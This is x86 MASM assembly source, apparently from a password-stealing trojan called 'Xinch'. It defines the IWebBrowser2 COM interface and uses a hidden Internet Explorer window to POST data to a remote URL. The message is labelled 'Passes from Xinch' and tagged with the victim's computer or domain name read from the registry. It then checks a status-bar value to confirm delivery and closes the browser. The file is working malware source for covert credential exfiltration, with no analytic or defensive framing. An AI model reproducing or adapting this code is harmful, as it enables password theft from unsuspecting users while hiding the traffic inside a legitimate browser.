sIID_IWebBrowser2       TEXTEQU  <{0D30C1661H, 0CDAFH, 011D0H, \
                                  {08AH, 03EH, 000H, 0C0H, 04FH, 0C9H, 0E2H, 06EH}}>

sCLSID_InternetExplorer TEXTEQU  <{00002DF01H, 00000H, 00000H, \
                                  {0C0H, 000H, 000H, 000H, 000H, 000H, 000H, 046H}}>

READYSTATE_COMPLETE     equ 4

; IWebBrowser2 Interface
IWebBrowser2 struct DWORD
        ; IUnknown
        IWebBrowser2_QueryInterface     comethod3       ?
        IWebBrowser2_AddRef             comethod1       ?
        IWebBrowser2_Release            comethod1       ?

        ; IDispatch
        IWebBrowser2_GetTypeInfoCount   comethod2       ?
        IWebBrowser2_GetTypeInfo        comethod4       ?
        IWebBrowser2_GetIDsOfNames      comethod6       ?
        IWebBrowser2_Invoke             comethod9       ?

        ; IWebBrowser
        IWebBrowser2_GoBack             comethod1       ?
        IWebBrowser2_GoForward          comethod1       ?
        IWebBrowser2_GoHome             comethod1       ?
        IWebBrowser2_GoSearch           comethod1       ?
        IWebBrowser2_Navigate           comethod6       ?
        IWebBrowser2_Refresh            comethod1       ?
        IWebBrowser2_Refresh2           comethod2       ?
        IWebBrowser2_Stop               comethod1       ?
        IWebBrowser2_Application        comethod2       ?
        IWebBrowser2_Parent             comethod2       ?
        IWebBrowser2_Container          comethod2       ?
        IWebBrowser2_Document           comethod2       ?
        IWebBrowser2_TopLevelContainer  comethod2       ?
        IWebBrowser2_Type               comethod2       ?
        IWebBrowser2_Left_get           comethod2       ?
        IWebBrowser2_Left_put           comethod2       ?
        IWebBrowser2_Top_get            comethod2       ?
        IWebBrowser2_Top_put            comethod2       ?
        IWebBrowser2_Width_get          comethod2       ?
        IWebBrowser2_Width_put          comethod2       ?
        IWebBrowser2_Height_get         comethod2       ?
        IWebBrowser2_Height_put         comethod2       ?
        IWebBrowser2_LocationName       comethod2       ?
        IWebBrowser2_LocationURL        comethod2       ?
        IWebBrowser2_Busy               comethod2       ?

        ; IWebBrowserApp
        IWebBrowser2_Quit               comethod1       ?
        IWebBrowser2_ClientToWindow     comethod3       ?
        IWebBrowser2_PutProperty        comethod3       ?
        IWebBrowser2_GetProperty        comethod3       ?
        IWebBrowser2_Name               comethod2       ?
        IWebBrowser2_HWND               comethod2       ?
        IWebBrowser2_FullName           comethod2       ?
        IWebBrowser2_Path               comethod2       ?
        IWebBrowser2_Visible_get        comethod2       ?
        IWebBrowser2_Visible_put        comethod2       ?
        IWebBrowser2_StatusBar_get      comethod2       ?
        IWebBrowser2_StatusBar_put      comethod2       ?
        IWebBrowser2_StatusText_get     comethod2       ?
        IWebBrowser2_StatusText_put     comethod2       ?
        IWebBrowser2_ToolBar_get        comethod2       ?
        IWebBrowser2_ToolBar_put        comethod2       ?
        IWebBrowser2_MenuBar_get        comethod2       ?
        IWebBrowser2_MenuBar_put        comethod2       ?
        IWebBrowser2_FullScreen_get     comethod2       ?
        IWebBrowser2_FullScreen_put     comethod2       ?

        ; IWebBrowser2
        IWebBrowser2_Navigate2          comethod6       ?
        IWebBrowser2_QueryStatusWB      comethod3       ?
        IWebBrowser2_ExecWB             comethod3       ?
        IWebBrowser2_ShowBrowserBar     comethod4       ?
        IWebBrowser2_ReadyState         comethod2       ?
        IWebBrowser2_Offline_get        comethod2       ?
        IWebBrowser2_Offline_put        comethod2       ?
        IWebBrowser2_Silent_get         comethod2       ?
        IWebBrowser2_Silent_put         comethod2       ?
        IWebBrowser2_RegisterAsBrowser_get      comethod2       ?
        IWebBrowser2_RegisterAsBrowser_put      comethod2       ?
        IWebBrowser2_RegisterAsDropTarget_get   comethod2       ?
        IWebBrowser2_RegisterAsDropTarget_put   comethod2       ?
        IWebBrowser2_TheaterMode_get    comethod2       ?
        IWebBrowser2_TheaterMode_put    comethod2       ?
        IWebBrowser2_AdressBar_get      comethod2       ?
        IWebBrowser2_AdressBar_put      comethod2       ?
        IWebBrowser2_Resizable_get      comethod2       ?
        IWebBrowser2_Resizable_put      comethod2       ?
IWebBrowser2 ends


; #########################################################################

        .data
	        szSubj      	db      "&b=Passes from Xinch (%s)&c=",0
                szHTTPVar1      db      "a=",0

                szHeader        db      "Content-Type: application/x-www-form-urlencoded",13,10,0

		szTypedUrls	db 	"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",0
		Compnamereg	db 	"System\CurrentControlSet\Control\ComputerName\ComputerName",0
		szComputerName	db 	"ComputerName",0
		bsize		dd	 1024
		szUrl1		db 	"DefaultDomainName",0

        .data?
                ppv     dd      ?
                v1      db      32 dup(?)
                v2      db      32 dup(?)
                v3      db      32 dup(?)
                v4      db      32 dup(?)

		bummer	db      1024 dup(?)
		bummer2 db 	1024 dup(?)
		zKey    dd 	?
	
        .code


; #########################################################################
IID_IWebBrowser2        GUID    sIID_IWebBrowser2
	CLSID_InternetExplorer  GUID    sCLSID_InternetExplorer

; #########################################################################

; Send lpData using hidden IE window
SendHTTPData proc uses esi edi lpData: DWORD
        LOCAL   statstr, urlstr, hdrstr, sf1, busy: DWORD

        xor     edi, edi

        ; URL bstr variant
        invoke  MultiByteToWideChar, CP_OEMCP, 0, offset szURL, -1, offset lpBuf1, 1024
        invoke  SysAllocString, offset lpBuf1
        mov     urlstr, eax

        mov     ecx, offset v1
        mov     [ecx][VARIANT.bstrVal], eax
        mov     [ecx][VARIANT.vt], VT_BSTR

        ; Empty variant
        mov     edx, offset v2
        mov     [edx][VARIANT.vt], VT_EMPTY

        ; POST data variant
        invoke  SFCopyFromStr, lpData
        mov     sf1, eax
        push    eax
        mov     edx, offset v3
        pop     [edx][VARIANT.parray]
        mov     [edx][VARIANT.vt], VT_ARRAY

        ; HTTP headers bstr variant
        invoke  MultiByteToWideChar, CP_OEMCP, 0, offset szHeader, -1, offset lpBuf1, 1024
        invoke  SysAllocString, offset lpBuf1
        mov     hdrstr, eax

        mov     edx, offset v4
        mov     [edx][VARIANT.bstrVal], eax
        mov     [edx][VARIANT.vt], VT_BSTR

        ; Open HTML page in IE
        coinvoke ppv, IWebBrowser2, Visible_put, VARIANT_FALSE
        coinvoke ppv, IWebBrowser2, Offline_put, VARIANT_FALSE
        coinvoke ppv, IWebBrowser2, Navigate2, addr v1, addr v2, addr v2, addr v3, addr v4
        .IF     FAILED
                jmp     @ret
        .ENDIF

        ; Wait while page is loading
        mov     esi, 18000      ; 3 minutes
@loop:
        dec     esi
        jz      @ret            ; 3 minutes timeout exceeded
        invoke  Sleep, 10       ; Leave some processor time
        coinvoke ppv, IWebBrowser2, ReadyState, addr busy       ; Get WB state
        cmp     busy, READYSTATE_COMPLETE                       ; When the page has been loaded - exit from loop
        jne     @loop

        ; Wait until "st. bar" jscript executes
        invoke  Sleep, 560
        coinvoke ppv, IWebBrowser2, StatusText_get, addr statstr
        .IF     SUCCEEDED
                ; Convert UNICODE -> ANSI
                invoke  WideCharToMultiByte, CP_ACP, 0, statstr, -1, offset lpBuf1, 1024, 0, 0
                invoke  SysFreeString, statstr

                ; Compare status bar text with the control value
                invoke  lstrcmp, offset lpBuf1, offset szStatTxt
                test    eax, eax
                jnz     @ret

                mov     edi, 1 ; Return True
        .ENDIF

@ret:
        ; Close IE window
        coinvoke ppv, IWebBrowser2, Quit

        ; Free SAFEARRAY data
        invoke  SafeArrayDestroy, sf1

        ; Free allocated strings
        invoke  SysFreeString, urlstr
        invoke  SysFreeString, hdrstr

        mov     eax, edi
        ret
SendHTTPData endp

; #########################################################################

; Send message to recepient using IE overlay
Sender proc uses edi lpMailMessage: DWORD
        LOCAL   buf: DWORD
	LOCAL Ver: OSVERSIONINFO

        xor     edi, edi

        invoke  OleInitialize, 0
        invoke  CoCreateInstance, addr CLSID_InternetExplorer, NULL,
                                  CLSCTX_SERVER,
                                  addr IID_IWebBrowser2, addr ppv
        .IF eax == S_OK
                ; Allocate bummer
                invoke  LocalAlloc, LMEM_FIXED or LMEM_ZEROINIT, 280000h
                mov     buf, eax

                ; Recepient
                invoke  lstrcpy, buf, offset szHTTPVar1
                mov     edx, offset szMailRecepient
                add     edx, 9 ; Skip "RCPT TO: " header
                invoke  lstrcat, buf, edx
mov Ver.dwOSVersionInfoSize, SizeOf Ver
invoke GetVersionEx, addr Ver
.IF Ver.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS
invoke RegOpenKeyEx, HKEY_LOCAL_MACHINE, addr Compnamereg, 0, KEY_QUERY_VALUE	, addr zKey
invoke RegQueryValueEx, zKey, addr szComputerName, 0, 0, addr bummer, addr bsize
invoke RegCloseKey, zKey
.ELSEIF Ver.dwPlatformId == VER_PLATFORM_WIN32_NT
invoke RegOpenKeyEx, HKEY_LOCAL_MACHINE, addr szTypedUrls, 0, KEY_QUERY_VALUE	, addr zKey
invoke RegQueryValueEx, zKey, addr szUrl1, 0, 0, addr bummer, addr bsize
invoke RegCloseKey, zKey
.ENDIF
invoke wsprintf,addr bummer2,addr szSubj,addr bummer
		invoke  lstrcat, buf, offset bummer2

                ; Msg body
                invoke  lstrcat, buf, lpMailMessage

                ; Finally, send formatted message
                invoke  SendHTTPData, buf
                mov     edi, eax

                ; Release interface
                coinvoke ppv, IWebBrowser2, Release

                ; Free bummer
                invoke  LocalFree, buf
        .ENDIF
        invoke  OleUninitialize

        mov     eax, edi
        ret
Sender endp
